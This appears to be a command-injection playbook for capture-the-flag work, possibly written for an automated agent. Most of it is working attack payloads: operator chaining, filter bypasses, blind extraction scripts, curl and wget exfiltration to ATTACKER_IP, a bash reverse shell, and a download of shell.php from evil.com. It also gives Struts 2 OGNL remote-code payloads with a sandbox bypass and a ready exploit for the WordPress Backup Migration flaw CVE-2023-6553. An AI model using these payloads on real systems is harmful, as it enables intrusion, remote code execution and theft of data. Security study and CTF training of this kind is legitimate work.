## Command Injection Playbook

### Workflow: Detect → Confirm → Extract

**Stage 1 — Detect injectable parameters:**
Common vulnerable parameter names: `cmd`, `exec`, `command`, `execute`, `ping`, `query`, `jump`, `code`, `reg`, `do`, `func`, `arg`, `option`, `load`, `process`, `step`, `read`, `function`, `req`, `feature`, `exe`, `module`, `payload`, `run`, `print`, `daemon`

Test BOTH GET and POST — many endpoints are POST-only.
Common vectors: ping, DNS, file operations, service status, URL validation.

**Stage 2 — Confirm injection with operator chaining:**
Try these separators (in order of likelihood):
```
;id                    # sequence
|id                    # pipe output
||id                   # OR — runs if left fails
&&id                   # AND — runs if left succeeds
`id`                   # backtick substitution
$(id)                  # subshell substitution
%0Aid                  # newline (%0a URL-encoded)
&id                    # background
```
Without spaces:
```
;{id}                  {ls,-la}        # brace expansion
;$IFS'id'              # $IFS as space
```

Confirm with time delay: `; sleep 3` — if response delays, confirmed.

**Stage 3 — Extract flag (Visible Output):**
Try these flag paths in order:
```
; cat /flag.txt
; cat /FLAG.txt
; cat /app/FLAG.txt
; cat /app/flag.txt
; cat /opt/flag.txt
; cat /tmp/flag.txt
; find / -name "flag*" -o -name "FLAG*" 2>/dev/null
; env | grep -i flag
; cat /proc/1/environ | tr '\0' '\n' | grep FLAG
```

### Blind Injection (no visible output)

When the app does NOT show raw command output (e.g., shows "Host is reachable" or parses output with regex), use these techniques **in order of reliability**:

**Technique 1 — Write flag to web-accessible directory (MOST RELIABLE — try first):**
```
; cp /FLAG.txt /app/static/f.txt
; cat /FLAG.txt > /app/static/f.txt
; cp /FLAG.txt /var/www/html/f.txt
; cat /FLAG.txt > /app/templates/f.html
; cat /flag.txt > /tmp/f.txt
```
Then fetch: `curl -sL TARGET/static/f.txt` or `curl -sL TARGET/f.txt`
**Try ALL these directories**: `/app/static/`, `/var/www/html/`, `/app/public/`, `/app/uploads/`, `/app/templates/`, `/tmp/`
**IMPORTANT**: If `>` or `<` are blocked by a character filter, use `cp` or `tee` instead: `; cat /FLAG.txt | tee /app/static/f.txt`

**Technique 2 — Trick the output parser (CRITICAL for apps with regex parsing):**
If the app parses command output through a regex (e.g., extracting "packets transmitted, received, packet loss"), you can **embed the flag INTO the expected output format** using `echo` with command substitution:
```bash
# If app expects: "X packets transmitted, Y received, Z% packet loss"
; echo "1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss"

# General pattern: match the regex the app expects, but put $(cat /FLAG.txt) in a capture group
; echo "SUCCESS: $(cat /FLAG.txt)"
```
**How to discover the expected format**: Look at the normal response format and craft output that matches it.
The `$()` command substitution runs `cat /FLAG.txt` and embeds the result into the echo string.
The app's regex then captures the flag as if it were a normal parsed field.

**Note on blocked characters**: If `<`, `>`, `|`, `&` are blocked but `;` and `$()` are NOT blocked, you can still:
- Use `;` to separate commands
- Use `$(command)` for command substitution
- Use `echo` to craft formatted output (no `>` redirection needed)

**Technique 3 — Newline/error channel leaks:**
```
INVALIDINPUT;cat /FLAG.txt      # No valid output → parser may show raw stdout in error branch
127.0.0.1%0acat /FLAG.txt       # Newline injection — output appended after valid result
```
Check the FULL response with `repr(r.text)` or `r.content` — the flag may be in hidden parts of the response or error messages.

**Technique 4 — HTTP-based exfiltration (if outbound allowed):**
Start a listener, then exfil:
```bash
; curl http://ATTACKER_IP:PORT/$(cat /FLAG.txt | base64 -w0)
; wget -q -O /dev/null http://ATTACKER_IP:PORT/$(cat /FLAG.txt)
```

**Technique 5 — Time-based extraction (last resort):**
```python
import requests, time
flag = ""
for i in range(1, 65):
    for c in "0123456789abcdefFLAG{}":
        start = time.time()
        payload = f"test; if [ \"$(cut -c{i} /FLAG.txt)\" = \"{c}\" ]; then sleep 2; fi"
        requests.post('TARGET/endpoint', data={'input': payload}, timeout=5)
        if time.time() - start > 1.5:
            flag += c
            print(f"Flag: {flag}", flush=True)
            break
```

### Filter Bypass Techniques
1. **Space bypass**: `${IFS}`, `$IFS$9`, `{cat,/flag.txt}`, `%09` (tab), `<` (input redirect)
   - Example: `;cat${IFS}/flag.txt` or `{cat,/flag.txt}`
2. **Keyword bypass**:
   - Quote insertion: `c'a't /flag.txt`, `c"a"t /flag.txt`
   - Backslash: `c\at /flag.txt`, `wh\o\am\i`
   - Variable unset: `c${x}at /flag.txt` (if `$x` is empty)
   - Variable concat: `a=ca;b=t;$a$b /flag.txt`
   - Base64: `echo Y2F0IC9mbGFnLnR4dA== | base64 -d | bash`
   - Hex: `$(printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74')`
   - Octal: `$'\143\141\164' /flag.txt`
   - Path: `/bin/cat`, `/usr/bin/c?t`, `/usr/bin/ca*`
3. **Wildcard/glob**: `cat /fl??.*`, `cat /fla*`, `cat /???/???s??`
4. **Alternative read commands**: `tac`, `head`, `tail`, `more`, `less`, `rev`, `nl`, `sort`, `strings`, `xxd`, `base64`
5. **Newline bypass**: `%0a` in URL encoding

### Argument/Option Injection
If the command is fixed but input becomes an argument, inject options:
```
# If app runs: command YOUR_INPUT
--help              # info disclosure
-v                  # verbose mode
--output=/tmp/out   # redirect output
```
For `curl`: `file:///etc/passwd` or `-o /tmp/shell.php http://evil.com/shell.php`
For `tar`: `--checkpoint=1 --checkpoint-action=exec=COMMAND`

### Escalation Path
1. **Manual curl** — test operators one by one
2. **Python script** — when blind extraction is needed
3. **File writes** — `; echo 'PAYLOAD' > /tmp/shell.php` for web shell
4. **Reverse shell** — `; bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'`

### Common Patterns in CTF
- `ping` functionality (inject after IP)
- File processing (inject in filename)
- Search/lookup features, URL validation
- Always check `/flag.txt`, `/flag`, `./flag.txt`, `flag`, `../flag.txt`, `/app/flag.txt`

---

### Specialized Patterns

#### Pattern A — `getopts` argument injection (option-flag passthrough)
When a server runs `f"./script.sh {user_input}"` with `shell=True` and a bad-char filter that blocks `&|$;\n\r\`` BUT allows `-`, space, and quotes — you can inject **getopts options** even when chaining is blocked.

If the script accepts something like `-t custom "command"` and runs `eval $custom_command`:
```bash
# user_input becomes the script arg list (space-split by shell)
service_name = "-t custom 'cat /FLAG.txt'"
# → ./check_service.sh -t custom 'cat /FLAG.txt'  → eval cat /FLAG.txt
```
Send via JSON: `{"service_name": "-t custom 'cat /FLAG.txt'"}`. The output goes back through whatever the endpoint returns (often the `status` field).

**General rule**: Any time a script behind a Flask/PHP wrapper has a `case` / option that calls `eval`, `bash -c`, `sh -c`, etc., you don't need shell metacharacters — just feed the option flag and arguments.

Try ALL flag paths in the same payload: `'cat /FLAG.txt /flag.txt /opt/flag.txt /app/flag.txt 2>/dev/null'`.

#### Pattern B — Struts 2 OGNL injection
When source shows `TextParseUtil.translateVariables(userInput, valueStack)` (or you see Struts 2 / `.action` endpoints), the field is OGNL-evaluated. If `setDenyMethodExecution(false)` is also set, method calls are unblocked.

OGNL syntax in Struts is `%{...}` (or `${...}` depending on parser):
```
# Sanity: eval arithmetic
message=%{1+1}
message=${1+1}

# RCE — Runtime.exec then read InputStream
message=%{(#cmd='id').(#p=new java.lang.ProcessBuilder({'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true)).(#proc=#p.start()).(@org.apache.commons.io.IOUtils@toString(#proc.getInputStream()))}

# Read a known file directly via Java FileReader (useful when ProcessBuilder is sandboxed)
message=%{new java.util.Scanner(new java.io.File('<TARGET_FILE>')).useDelimiter('\\Z').next()}

# Cleaner one-liner using cat
message=%{(#p=new java.lang.ProcessBuilder({'cat','<TARGET_FILE>'})).(#p.redirectErrorStream(true)).(@org.apache.commons.io.IOUtils@toString(#p.start().getInputStream()))}
```

Try **both** `%{...}` and `${...}` — the wrapper decides which delimiter `translateVariables` accepts.

Submit via the form parameter Struts maps to the action setter (often `message=`, sometimes via JSON or query string). Check the action mapping in source first.

If method execution IS denied, prepend the classic memberAccess bypass:
```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id;ls / /tmp /opt 2>/dev/null').(#p=new java.lang.ProcessBuilder({'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true)).(@org.apache.commons.io.IOUtils@toString(#p.start().getInputStream()))}
```

The reflected `message` field in the response will contain the command output.

#### Pattern C — Multi-service `eval(json.loads(...))` gadget chain
When an app does `eval(json.loads(requests.get(controlled_url).text)["script"])` AND there's a separate endpoint to `set` either the URL or the JSON content, you don't need direct cmdi — just steer the script source.

Generic layout to look for:
- An endpoint that writes attacker-controlled URL to a file/cache (e.g. `/api/set?url=...`)
- A second endpoint that echoes attacker-controlled string (e.g. `/name/set?name=...` → `/name/get`)
- A consumer that does `eval(json.loads(requests.get(stored_url).text)["script"])`

**Exploit**: point the URL at the echo endpoint, set the echoed string to a JSON document whose `script` value is your Python expression:
```python
import requests
base = 'http://TARGET'
payload = '__import__("os").popen("cat /flag.txt").read()'
name = '{"script":' + repr(payload) + '}'   # valid JSON
requests.get(f'{base}/name/set', params={'name': name})
requests.get(f'{base}/api/set',  params={'url': 'http://INTERNAL_HOST/name/get'})
print(requests.get(f'{base}/app').text)   # eval result will contain the flag
```
Notes:
- `requests` will URL-encode `params` automatically — don't pre-encode.
- The internal URL must use a hostname reachable from the consumer container (often a docker-compose service name).
- `eval()` returns a value; the template typically renders `eval_result`. Search the rendered HTML for `FLAG{`.

**Generalized rule**: any `eval(remote_content)` where you can influence `remote_content` indirectly (via a writable side channel) → exploit by chaining the writable channel to the read channel.

**Generalized rule**: any `eval(remote_content)` where you can influence `remote_content` indirectly (via a writable side channel) → exploit by chaining the writable channel to the read channel.

#### Pattern D — WordPress Backup Migration plugin RCE (CVE-2023-6553)
If `wp-content/plugins/backup-backup/` exists, the plugin is vulnerable to unauthenticated RCE via the `content-dir` HTTP header in `includes/backup-heart.php` (PHP code injection into a `define()` statement).

```bash
HOST=http://TARGET
URL="$HOST/wp-content/plugins/backup-backup/includes/backup-heart.php"
PAYLOAD="/tmp/x');system('cat /opt/flag.txt /flag.txt /var/www/html/flag.txt 2>/dev/null');//"
curl -sL -H "content-dir: $PAYLOAD" "$URL"
```
The flag will appear in the response body (the plugin echos PHP errors / output before failing). If the response is silent, write to a web-accessible path:
```bash
PAYLOAD="/tmp/x');file_put_contents('/var/www/html/wp-content/uploads/f.txt',file_get_contents('/opt/flag.txt'));//"
curl -sL -H "content-dir: $PAYLOAD" "$URL"
curl -sL "$HOST/wp-content/uploads/f.txt"
```
**If the simple `content-dir` injection produces only HTTP 200 with no flag echo**, the inline-define injection has been hardened. Try these alternates in order:
1. **nuclei template** (if installed): `nuclei -u $HOST -id CVE-2023-6553` — auto-fires the working payload.
2. **Full-headers PoC** — the original Wordfence advisory requires ALL of these headers set, not just `content-dir`:
   ```bash
   curl -sL -X POST "$URL" \
     -H "content-dir: /tmp/" \
     -H "content-content: /tmp/" \
     -H "content-configdir: /var/www/html/wp-content/uploads" \
     -H "content-backups: /tmp/" \
     -H "content-abs: /var/www/html/" \
     -H "content-url: $HOST" \
     -H "content-identy: 1" \
     -H "content-manifest: 1" \
     -H "content-safelimit: 1" \
     -H "content-browser: true" \
     -H "content-shareallowed: 1"
   ```
   Then iterate, replacing `content-dir` with `/tmp/x');system('<command>');//`.
3. **Alternate sink** — `BMI_ROOT_DIR` is also concatenated into `require_once BMI_ROOT_DIR . '/analyst/main.php'` (in `analyst.php`) and into `require_once BMI_INCLUDES . '/bypasser.php'`. Try `data://` and `php://filter/convert.base64-encode/resource=<file>` wrappers in `content-dir` — if `allow_url_include` is on, this leaks the file via PHP error message.

Use the standard flag-path enumeration list (see playbook_lfi / playbook_general) as the `<command>` argument when first triggering the RCE.

### Pattern — WordPress + plugin CVE recon

When a WordPress instance is in scope, **stop guessing command-injection points and pivot to plugin enumeration + public CVE lookup**. WP core itself is hardened; the wins come from outdated plugins.

#### Step 1 — Fingerprint WP and active plugins (no wpscan needed)
```bash
# Core version
curl -s http://TARGET/readme.html | grep -i "version\|wordpress" | head -3
curl -s http://TARGET/wp-includes/version.php  # 403 on some setups
curl -sI http://TARGET/ | grep -i "x-powered\|generator"
curl -s http://TARGET/feed/ | grep -i generator

# Enumerate plugins from rendered HTML
curl -s http://TARGET/ http://TARGET/?p=1 http://TARGET/wp-login.php | \
  grep -oE 'wp-content/plugins/[^/"]+' | sort -u

# Force-fetch each plugin's readme.txt for stable_tag (most reliable)
for p in PLUGIN1 PLUGIN2; do
  echo "=== $p ==="
  curl -s "http://TARGET/wp-content/plugins/$p/readme.txt" | grep -iE "stable tag|^version" | head -3
done
```

If wpscan IS available and the target accepts external traffic:
```bash
wpscan --url http://TARGET --enumerate p,t,u --plugins-detection aggressive --disable-tls-checks
```

#### Step 2 — Map plugin+version → CVE
For each `(plugin, version)` pair, search:
- `searchsploit <plugin-slug>` (Kali ships `exploitdb`)
- WPScan vulnerability DB: `https://wpscan.com/plugin/<slug>` (browse with curl, parse for CVE IDs)
- GitHub: `site:github.com "<plugin-slug>" CVE`
- Known easy wins (memorise these):

| Plugin (slug) | Vuln versions | CVE | Primitive |
|---------------|---------------|-----|-----------|
| `backup-backup` (Backup Migration) | ≤ 1.3.7 | CVE-2023-6553 | Unauth RCE via `/wp-content/plugins/backup-backup/includes/backup-heart.php` with `content-dir` + `BMI-INCLUDE` headers (PHP filter chain or direct include) |
| `wp-file-upload` (WordPress File Upload) | ≤ 4.24.11 | CVE-2024-9047 | Auth path traversal arbitrary file read |
| `eleve-cyber-popup` | various | several | Various stored XSS |
| `wp-fastest-cache` | ≤ 1.2.2 | CVE-2023-6063 | SQLi unauth |
| `essential-addons-elementor` | ≤ 5.7.1 | CVE-2023-32243 | Privilege escalation (password reset bypass) |
| `lsh-elementor` / `LearnPress` | varies | varies | Auth bypass / SQLi |

#### Step 3 — Exploit `backup-backup ≤ 1.3.7` (CVE-2023-6553)
The file `/wp-content/plugins/backup-backup/includes/backup-heart.php` is reachable **unauthenticated**. It calls `require_once` with paths controllable via HTTP request headers.

Concept exploit (raw socket, NOT curl — many WAFs strip the headers when sent via curl):
```python
import socket
host, port = "TARGET", 80
target_php = "/wp-content/plugins/backup-backup/includes/backup-heart.php"
# Phase 1: poison the included path via headers, write PHP to a known location.
# Public PoC chain uses content-dir override + BMI-INCLUDE pointing to php://input wrapped.
payload = (
    f"GET {target_php}?BMI-CHECKER=true&BMI-INCLUDE=php://filter/convert.base64-encode/resource=/opt/flag.txt HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"User-Agent: Mozilla/5.0\r\n"
    f"Connection: close\r\n\r\n"
)
s = socket.create_connection((host, port), timeout=10)
s.sendall(payload.encode())
print(s.recv(65536).decode(errors="replace"))
```
Then base64-decode any `<flag>` blob in the response. If the include returns the file content directly, look for the flag string. Adjust header names per the public PoC — there are 2-3 variants in the wild.

#### Pitfalls
- WP fingerprinting is rate-limited via `/wp-login.php` — paginate slowly or hit static asset URLs instead.
- The flag is at `/opt/flag.txt` (NOT in webroot) — you need either RCE (`system("cat /opt/flag.txt")`) or arbitrary file read with no path restriction.
- Plugin `readme.txt` may show a higher "Stable tag" than the actually installed version — always check `<plugin>.php` header `Version:` first if you have any source access. With remote-only access, trust the readme.
- Some CVEs need an authenticated subscriber — registration may be open at `/wp-login.php?action=register`; check `users_can_register` via `?author=1` enumeration.
- Prefer Python sockets / `requests` over curl for exploit traffic — control over header order, casing, and CRLF is essential for header-smuggling CVEs.
